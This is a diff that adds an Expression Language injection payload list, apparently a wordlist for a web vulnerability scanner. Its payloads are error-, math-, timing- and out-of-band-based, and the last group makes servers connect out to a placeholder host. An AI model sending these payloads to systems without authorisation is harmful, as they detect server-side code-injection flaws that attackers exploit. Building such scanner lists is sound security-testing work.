@@ -1,0 +1,22 @@
+##EL Injection - Error-Based##
+${invalid}
+%{invalid}
+${T(invalid.Class)}
+${1/0}
+##EL Injection - Math-Based (Canary: 1337)##
+${7*191}
+%{7*191}
+${{7*191}}
+${T(java.lang.Math).abs(-1337)}
+#{T(java.lang.Math).abs(-1337)}
+${7*191}${7*191}
+##EL Injection - Timing-Based##
+${T(java.lang.Thread).sleep(5000)}
+#{T(java.lang.Thread).sleep(5000)}
+%{@java.lang.Thread@sleep(5000)}
+##EL Injection - OOB##
+${T(java.net.URL).new('http://{domain}/eleval').openStream()}
+#{T(java.net.URL).new('http://{domain}/eleval').openStream()}
+${new java.net.URL("http://{domain}/eleval").openStream()}
+${new java.net.Socket("{domain}",9999)}
+%{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
